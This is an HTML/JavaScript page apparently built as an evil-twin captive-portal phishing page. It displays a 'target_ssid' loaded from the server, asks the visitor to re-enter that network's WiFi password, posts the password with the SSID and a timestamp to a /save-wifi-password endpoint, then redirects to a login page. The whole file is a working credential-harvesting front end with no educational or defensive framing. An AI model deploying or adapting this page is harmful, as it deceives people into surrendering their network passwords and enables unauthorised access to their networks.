<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Password Required</title>
    <link rel="stylesheet" href="style.css">
    <style>
        .wifi-container {
            max-width: 400px;
            margin: 50px auto;
            padding: 30px;
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        
        .wifi-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }
        
        .ssid-display {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            font-weight: bold;
            color: #333;
        }
        
        .wifi-form {
            margin-top: 20px;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: #333;
        }
        
        .form-group input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: #007bff;
        }
        
        .btn-submit {
            width: 100%;
            padding: 12px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }
        
        .btn-submit:hover {
            background: #0056b3;
        }
        
        .status-message {
            margin-top: 15px;
            padding: 10px;
            border-radius: 6px;
            display: none;
        }
        
        .status-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .status-error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
    </style>
</head>
<body>
    <div class="wifi-container">
        <div class="wifi-icon">ðŸ“¶</div>
        <h2>WiFi Password Required</h2>
        <p>Please enter the password for the following WiFi network:</p>
        
        <div class="ssid-display" id="ssidDisplay">
            Loading SSID...
        </div>
        
        <form class="wifi-form" id="wifiForm">
            <div class="form-group">
                <label for="wifiPassword">WiFi Password:</label>
                <input type="password" id="wifiPassword" name="wifiPassword" required placeholder="Enter WiFi password">
            </div>
            <button type="submit" class="btn-submit">Submit Password</button>
        </form>
        
        <div id="statusMessage" class="status-message"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const wifiForm = document.getElementById('wifiForm');
            const ssidDisplay = document.getElementById('ssidDisplay');
            const statusMessage = document.getElementById('statusMessage');
            
            // Load SSID from server
            loadSSID();
            
            wifiForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const wifiPassword = document.getElementById('wifiPassword').value;
                
                if (!wifiPassword.trim()) {
                    showStatus('Please enter a WiFi password', 'error');
                    return;
                }
                
                // Send WiFi password to server
                saveWiFiPassword(wifiPassword);
            });
            
            function loadSSID() {
                fetch('/config')
                    .then(response => response.json())
                    .then(data => {
                        ssidDisplay.textContent = data.target_ssid || 'Unknown Network';
                    })
                    .catch(error => {
                        console.error('Error loading SSID:', error);
                        ssidDisplay.textContent = 'Unknown Network';
                    });
            }
            
            function saveWiFiPassword(password) {
                const data = {
                    ssid: ssidDisplay.textContent,
                    password: password,
                    timestamp: new Date().toISOString()
                };
                
                fetch('/save-wifi-password', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                })
                .then(response => response.text())
                .then(result => {
                    showStatus('WiFi password saved successfully! Redirecting to login...', 'success');
                    
                    // Redirect to login page after 2 seconds
                    setTimeout(() => {
                        window.location.href = '/login.html';
                    }, 2000);
                })
                .catch(error => {
                    console.error('Error saving WiFi password:', error);
                    showStatus('Error saving WiFi password. Please try again.', 'error');
                });
            }
            
            function showStatus(message, type) {
                statusMessage.textContent = message;
                statusMessage.className = `status-message status-${type}`;
                statusMessage.style.display = 'block';
            }
        });
    </script>
</body>
</html>
